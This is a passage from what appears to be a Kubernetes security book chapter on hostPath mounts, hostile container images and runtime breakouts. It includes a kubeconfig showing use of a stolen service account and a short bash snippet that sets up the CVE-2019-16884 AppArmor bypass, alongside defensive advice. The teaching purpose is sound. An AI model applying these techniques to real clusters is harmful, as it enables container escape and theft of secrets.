        /var/lib/kubelet/pods/.../kubernetes.io~secret/.../...229622223/ca.crt
    server: https://10.0.1.1:6443
  name: tmpk8s
# ...
system:serviceaccount:kube-system:priv-app</pre>

<p>You’re now able to use the <code>system:serviceaccount:kube-system:priv-app</code> service account (SA) more easily with
<code>kubectl</code> as it’s configured in your <em>~/.kube/config</em>. An attacker can do the same thing—hostile root access to
Kubernetes nodes reveals all its Secrets!</p>
<div data-type="tip"><h6>Tip</h6>
<p>CSI storage interfaces and host filesystem mounts both pose a security risk if others have access to them. We explore
external storage, the Container Storage Interface (CSI), and other mounts in greater detail in the <a data-type="xref" href="ch06.xhtml#ch-storage">Chapter 6</a>.</p>
</div>

<p>What else is there mounted <a data-type="indexterm" data-primary="filesystem" data-secondary="mount points, searching" data-startref="fs_mp_serch" id="idm45302806249456"/>that might catch an adversary’s treasure-hungry gaze? Let’s explore further.</p>
</div></section>













<section data-type="sect1" data-pdf-bookmark="Host Mounts"><div class="sect1" id="idm45302806502016">
<h1>Host Mounts</h1>

<p>The Kubernetes <code>hostPath</code> volume type mounts a <a data-type="indexterm" data-primary="filesystems" data-secondary="hostPath" id="fs_hostPath"/><a data-type="indexterm" data-primary="hostPath" id="hostPath"/>filesystem path from the host into the container, which may be useful for
some applications. <em>/var/log</em> is a popular mount point, so the host’s journal process collects container syslog events.</p>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p><code>HostPath</code> volumes should be avoided when possible as they present many risks. Best practice is to scope to only the
needed file or directory using the <code>ReadOnly</code> mount flag.</p>
</div>

<p>Other use cases for <code>hostPath</code> mounts include persistence for datastores in the pod or hosting static data, libraries,
and caches.</p>

<p>Using host disks or permanently attaching storage to a node creates a coupling between workloads and the underlying
node, as the workloads must be restarted on that node in order to function properly. This makes scaling and resilience
much more difficult.</p>

<p>Host mounts can be dangerous if a <a data-type="indexterm" data-primary="symlinks" data-secondary="host mounts and" id="idm45302806239216"/>symlink is created inside the container that is unintentionally resolved on the host
filesystem. This happened in CVE-2017–1002101, where a bug in the symbolic link–handling code allowed an adversary
inside a container to explore the host mounted filesystem that the mount point was on.</p>

<p>Mounting of sockets from the host into the container is also a popular <code>hostMount</code> use case, which allows a client
inside the container to run commands against a server on the host. This is an easy path to container breakout by
starting a new privileged container on the host and escaping.</p>

<p>Mounting sensitive directories or files from the host may also provide an opportunity to pivot if they can be used
for network services.</p>

<p><code>hostPath</code> volumes are writeable on the host partition outside the container, and are always mounted on the host
filesystem as owned by <code>root:root</code>. For this reason, a nonroot user should always be used inside the container, and
filesystem permissions should always be configured on the host if write access is needed inside the container.</p>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>If you are  restricting <code>hostPath</code> access to specific directories with admission controllers, those <code>volumeMounts</code> must
be <code>readOnly</code>, otherwise new symlinks can be used to traverse the host filesystem.</p>
</div>

<p>Ultimately data is the lifeblood of your business, and managing state is hard. An attacker will be looking to gather,
exfiltrate, and cryptolock any data they can find in your systems. Consuming an external service (such as an object
store or database hosted outside your cluster) to persist data is often the most resilient and scalable way to secure a
system—however, for high-bandwidth or low-latency applications this may be impossible.</p>

<p>For everything else, cloud provider or internal service integrations remove the link between a workload
and the underlying host, which makes scaling, upgrades, and system deployments much <a data-type="indexterm" data-primary="filesystems" data-secondary="hostPath" data-startref="fs_hostPath" id="idm45302806230768"/><a data-type="indexterm" data-primary="hostPath" data-startref="hostPath" id="idm45302806229520"/>easier.</p>
<div data-type="tip"><h6>Tip</h6>
<p>Managed services and dedicated infrastructure clusters are an easier cluster security abstraction to reason about, and
we talk more about them in <a data-type="xref" href="ch07.xhtml#ch-hard-multi-tenancy">Chapter 7</a>.</p>
</div>








<section data-type="sect2" data-pdf-bookmark="Hostile Containers"><div class="sect2" id="idm45302806226192">
<h2>Hostile Containers</h2>

<p>A hostile container<a data-type="indexterm" data-primary="containers" data-secondary="hostile" id="cont_hostile"/><a data-type="indexterm" data-primary="hostile containers" id="hostile_cont"/> is one that is under an attacker’s control. It may be created by an attacker with Kubernetes access
(perhaps the <code>kubelet</code>, or API server), or a container image with automated exploit code embedded (for example, a
“trojanized” image from <a href="https://oreil.ly/2vvV0">dockerscan</a> that can start a reverse shell in a legitimate
container to give attackers access to your production systems), or have been accessed by a remote adversary
post-deployment.</p>

<p>What about the filesystem of a hostile container image? If Captain Hashjack can force Kubernetes to run a container they
have built or corrupted, they may try to attack the orchestrator or container, runtimes, or clients (such as <code>kubectl</code>).</p>

<p>One attack (<a href="https://oreil.ly/Hj4i3">CVE-2019-16884</a>) involves<a data-type="indexterm" data-primary="CVEs (Common Vulnerabilities and Exposures)" data-secondary="hostile containers" id="idm45302806218560"/><a data-type="indexterm" data-primary="security, CVEs, hostile containers" id="idm45302806217520"/> a container image that defines
a <code>VOLUME</code> over a directory AppArmor uses for configuration, essentially disabling it at container runtime:</p>

<pre data-type="programlisting" data-code-language="bash">mkdir -p rootfs/proc/self/<code class="o">{</code>attr,fd<code class="o">}</code>
touch rootfs/proc/self/<code class="o">{</code>status,attr/exec<code class="o">}</code>
touch rootfs/proc/self/fd/<code class="o">{</code>4,5<code class="o">}</code></pre>

<p>This may be used as part of a further attack on the system, but as AppArmor is unlikely to be the only layer of defense,
it is not as serious as it may appear.</p>

<p>Another dangerous container image is one used by a <em>/proc/self/exe</em> breakout in
<a href="https://oreil.ly/1j7We">CVE-2019-5736</a>. This exploit requires a container with a maliciously
linked <code>ENTRYPOINT</code>, so can’t be run in a container that has already started.</p>

<p>As these attacks show, unless a container is built from trusted components, it should be considered untrusted to defend
against further unknown attacks<a data-type="indexterm" data-primary="containers" data-secondary="hostile" data-startref="cont_hostile" id="idm45302806209936"/><a data-type="indexterm" data-primary="hostile containers" data-startref="hostile_cont" id="idm45302806208688"/> such as this.</p>
<div data-type="caution"><h6>Caution</h6>
<p>A collection of <code>kubectl cp</code> CVEs
(<a href="https://oreil.ly/QdTZ9">CVE-2018-1002100</a>,
<a href="https://oreil.ly/wB13O">CVE-2019-11249</a>) require a malicious tar binary inside the
container. The vulnerability stems from <code>kubectl</code> trusting the input it receives from the <code>scp</code> and <code>tar</code> process inside
the container, which can be manipulated to overwrite files on the machine the <code>kubectl</code> binary is being run on.</p>
</div>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Runtime"><div class="sect2" id="idm45302806202496">
<h2>Runtime</h2>

<p>The danger of the <em>/proc/self/exe</em> breakout in <a href="https://oreil.ly/yRLNz">CVE-2019-5736</a> is that a
hostile container process can overwrite the <code>runc</code> binary on the host. That <code>runc</code> binary is owned by root, but as it<a data-type="indexterm" data-primary="CVEs (Common Vulnerabilities and Exposures)" data-secondary="runc" id="idm45302806198880"/><a data-type="indexterm" data-primary="security" data-secondary="CVEs" data-tertiary="runc" id="idm45302806197808"/><a data-type="indexterm" data-primary="runc" data-secondary="CVEs" id="idm45302806196592"/> is
also executed by root on the host (as most container runtimes need some root capabilities), it can be overwritten from
inside the container in this attack. This is because the container process is a child of <code>runc</code>, and this exploit uses
the permission <code>runc</code> has to overwrite itself.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>Protecting the host from privileged container processes is best achieved by removing root privileges from the container
runtime. Both <code>runc</code> and Podman can run in rootless mode, which we explore in <a data-type="xref" href="ch03.xhtml#ch-container-runtime-isolation">Chapter 3</a>.</p>
</div>

<p class="pagebreak-before">The root user has many special privileges as a result of years of kernel development that assumed only one “root” user.
To limit the impact of RCE to the container, pod, and host, applications inside a container should not be run as root,
and their capabilities should be dropped, without the ability to gain privileges by setting the
<code>allowPrivilegeEscalation</code> <code>securityContext</code> field to <code>false</code> (which sets the <code>no_new_privs</code> flag on the container process).</p>
</div></section>





</div></section>







</div></section></div></body></html>